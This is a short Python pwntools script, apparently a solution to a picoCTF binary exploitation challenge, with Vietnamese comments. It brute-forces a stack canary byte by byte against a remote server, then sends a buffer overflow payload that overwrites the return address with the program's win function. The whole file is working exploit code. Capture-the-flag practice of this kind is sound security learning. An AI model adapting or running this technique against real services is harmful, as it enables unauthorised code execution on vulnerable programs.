#!/usr/bin/env python3
from pwn import *

# Thay bằng đúng địa chỉ IP và cổng của bạn
HOST = "saturn.picoctf.net"
PORT = 63707

context.binary = exe = ELF('vuln', checksec=False)
# p = process(exe.path)
# p = remote(HOST, PORT)
found = 1

offset = 0x40

canary = b""
# === stage 1: Bruteforce canary ===
for i in range(1, 5):
    for b in range(256):
        io = remote(HOST, PORT)

        payload = b'A' * offset + canary + bytes([b])
        io.sendlineafter(b'> ', str(offset + i).encode())
        io.sendlineafter(b'> ', payload)

        # Nếu chương trình không crash ⇒ trả về được
        res = io.recvall()
        if b'Stack Smashing Detected' not in res:
            canary += bytes([b])
            log.success(f"Canary byte {i}: {hex(b)}")
            io.close()
            break

# === stage 2: do overflow ===
if found:
    p = remote(HOST, PORT)
    payload = b'A'*offset
    payload += canary
    payload += b'A'*0x10
    payload += p32(exe.sym.win)
    p.sendlineafter(b'> ', b'100')
    p.sendlineafter(b'> ', payload)
    p.interactive()
